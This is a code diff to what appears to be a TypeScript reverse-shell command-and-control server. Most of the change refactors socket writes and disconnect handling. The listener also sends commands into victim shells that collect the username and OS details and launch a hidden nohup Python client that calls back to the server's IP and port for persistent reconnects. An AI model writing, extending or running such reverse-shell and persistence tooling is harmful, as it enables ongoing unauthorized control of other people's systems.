@@ -4,7 +4,7 @@ import './tunnel';
 import * as net from 'net';
 import fs from 'fs';
 import path from 'path';
-import { activeConnections, activeSSHConnections, ConnectionInfo, serverIp } from './state';
+import { activeConnections, activeSSHConnections, aliasesByClientId, ConnectionInfo, serverIp, writeSocketSafe } from './state';
 
 const PORT = 13335;
 
@@ -47,7 +47,8 @@ function startInfoCollection(socket: net.Socket, info: ConnectionInfo) {
             socket.off('data', infoCallback);
             refreshAllBottomBars();
             setTimeout(() => {
-                socket.write(
+                writeSocketSafe(
+                    socket,
                     'if which tmux > /dev/null 2>&1; then' +
                     ' printf "\\x1b[9198t";' +
                     ' tmux new-session -d -s omc 2>/dev/null;' +
@@ -59,7 +60,7 @@ function startInfoCollection(socket: net.Socket, info: ConnectionInfo) {
         }
     };
     socket.on('data', infoCallback);
-    socket.write('echo ---START_INFO$[1+1]---\necho WHOAMI=$(whoami)\ncat /etc/os-release\necho ---END_INFO$[1+1]---\n');
+    writeSocketSafe(socket,'echo ---START_INFO$[1+1]---\necho WHOAMI=$(whoami)\ncat /etc/os-release\necho ---END_INFO$[1+1]---\n');
     refreshAllBottomBars();
 }
 
@@ -69,8 +70,42 @@ function attachSocket(connectionId: string, info: ConnectionInfo, socket: net.So
     socket.removeAllListeners('close');
     socket.removeAllListeners('error');
 
+    let closed = false;
+    const cleanupDisconnected = (reason: string) => {
+        if (closed) return;
+        closed = true;
+        console.log(`[-] Connection closed: ${connectionId}${reason ? ` (${reason})` : ''}`);
+        const currentInfo = activeConnections.get(connectionId);
+        if (currentInfo === info) {
+            info.disconnected = true;
+            info.disconnectedAt = Date.now();
+            setTimeout(() => {
+                if (info.disconnected && activeConnections.get(connectionId) === info) {
+                    console.log(`[-] Removing stale connection: ${connectionId}`);
+                    activeConnections.delete(connectionId);
+                    activeSSHConnections.forEach((sshState) => {
+                        if (sshState.selectedId === connectionId) {
+                            sshState.selectedId = null;
+                            sshState.commandMode = true;
+                            sshState.stream?.write('\r\n[connection timed out]\r\n');
+                            sshState.stream?.write('\x1b[r');
+                        }
+                    });
+                    refreshAllBottomBars();
+                }
+            }, 5 * 60 * 1000);
+        }
+        activeSSHConnections.forEach((sshState) => {
+            if (sshState.selectedId === connectionId) {
+                sshState.stream?.write('\r\n[disconnected, waiting for reconnect...]\r\n');
+            }
+        });
+        refreshAllBottomBars();
+        clearInterval(interval);
+    };
+
     const interval = setInterval(() => {
-        try { info.resize(info.rows, info.cols); } catch (e) { }
+        if (!writeSocketSafe(info.socket, `\x1b[8;${info.rows};${info.cols}t`)) cleanupDisconnected('write failed');
     }, 30000);
 
     socket.on('data', (rawData) => {
@@ -107,41 +142,11 @@ function attachSocket(connectionId: string, info: ConnectionInfo, socket: net.So
         });
     });
 
-    socket.on('close', () => {
-        console.log(`[-] Connection closed: ${connectionId}`);
-        const info = activeConnections.get(connectionId);
-        if (info) {
-            info.disconnected = true;
-            info.disconnectedAt = Date.now();
-            // Auto-remove after 5 minutes if not reconnected
-            setTimeout(() => {
-                if (info.disconnected && activeConnections.get(connectionId) === info) {
-                    console.log(`[-] Removing stale connection: ${connectionId}`);
-                    activeConnections.delete(connectionId);
-                    activeSSHConnections.forEach((sshState) => {
-                        if (sshState.selectedId === connectionId) {
-                            sshState.selectedId = null;
-                            sshState.commandMode = true;
-                            sshState.stream?.write('\r\n[connection timed out]\r\n');
-                            sshState.stream?.write('\x1b[r');
-                        }
-                    });
-                    refreshAllBottomBars();
-                }
-            }, 5 * 60 * 1000);
-        }
-        activeSSHConnections.forEach((sshState) => {
-            if (sshState.selectedId === connectionId) {
-                sshState.stream?.write('\r\n[disconnected, waiting for reconnect...]\r\n');
-            }
-        });
-        refreshAllBottomBars();
-        clearInterval(interval);
-    });
+    socket.on('close', () => cleanupDisconnected('close'));
 
     socket.on('error', (err) => {
         console.error(`[!] Socket error on ${connectionId}: ${err.message}`);
-        clearInterval(interval);
+        cleanupDisconnected(err.message);
     });
 }
 
@@ -179,7 +184,7 @@ reverseShellServer.on('connection', (socket) => {
         // Also try to bootstrap python client in background for future reconnects
         // Send bootstrap BEFORE tmux attaches (info collection sends tmux attach later)
         const bootstrapCommand = `nohup python3 -c '${escapedScript}' ${serverIp} ${PORT} </dev/null >/dev/null 2>&1 &\n`;
-        socket.write(bootstrapCommand);
+        writeSocketSafe(socket,bootstrapCommand);
 
         // Replay buffered data
         if (headerBuf.length) socket.emit('data', headerBuf);
@@ -255,6 +260,8 @@ reverseShellServer.on('connection', (socket) => {
             } else {
                 // New python client
                 const info = new ConnectionInfo(socket, whoami, osName);
+                info.clientId = clientId;
+                info.alias = aliasesByClientId.get(clientId) ?? '';
                 if (hasTmux) info.tmuxEnabled = true;
                 activeConnections.set(clientId, info);
                 attachSocket(clientId, info, socket);
